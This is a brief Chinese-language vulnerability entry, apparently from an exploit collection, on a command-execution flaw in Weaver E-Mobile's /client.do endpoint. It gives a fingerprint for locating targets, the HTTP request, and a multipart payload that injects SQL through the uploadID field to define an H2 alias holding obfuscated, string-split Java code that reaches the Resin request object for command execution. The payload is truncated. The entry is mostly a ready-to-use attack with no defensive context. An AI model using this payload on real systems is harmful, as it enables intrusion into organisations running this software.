# 泛微E-Mobile-client.do存在命令执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"Weaver E-Mobile"`
- **请求**：`POST /client.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJe…`

**请求体 / payload**
```
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"
getupload
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="uploadID"
1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_…（脚本共 1137 字，完整版见原文）
```